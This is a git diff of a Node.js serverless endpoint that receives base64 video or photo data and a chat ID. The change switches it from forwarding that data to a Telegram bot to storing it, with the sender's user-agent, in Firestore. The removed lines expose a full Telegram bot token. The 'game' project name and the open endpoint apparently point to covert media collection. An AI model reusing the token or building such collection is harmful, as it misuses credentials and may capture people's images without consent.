@@ -1,5 +1,16 @@
 const axios = require('axios');
 
+// Firebase Admin (لازم تثبت المكتبة)
+const admin = require('firebase-admin');
+
+if (!admin.apps.length) {
+    admin.initializeApp({
+        credential: admin.credential.applicationDefault(),
+        projectId: 'game-a1aca'
+    });
+}
+const db = admin.firestore();
+
 module.exports = async (req, res) => {
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
@@ -8,20 +19,17 @@ module.exports = async (req, res) => {
 
     try {
         const { chat_id, video_base64 } = req.body;
-        if (!video_base64) return res.json({ error: 'no video' });
-        
-        const videoBuffer = Buffer.from(video_base64, 'base64');
-        const FormData = require('form-data');
-        const form = new FormData();
-        form.append('chat_id', chat_id);
-        form.append('video', videoBuffer, { filename: 'video.webm', contentType: 'video/webm' });
-        form.append('caption', '🎬 فيديو');
-        
-        await axios.post(
-            'https://api.telegram.org/bot8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo/sendVideo',
-            form,
-            { headers: form.getHeaders(), timeout: 30000 }
-        );
+        if (!video_base64) return res.json({ error: 'no data' });
+
+        // تخزين في Firestore
+        await db.collection('media').add({
+            chatId: chat_id || 'unknown',
+            data: video_base64,
+            type: video_base64.length > 100000 ? 'video' : 'photo',
+            timestamp: admin.firestore.FieldValue.serverTimestamp(),
+            device: req.headers['user-agent'] || 'unknown'
+        });
+
         return res.json({ success: true });
     } catch (e) {
         return res.json({ error: e.message });
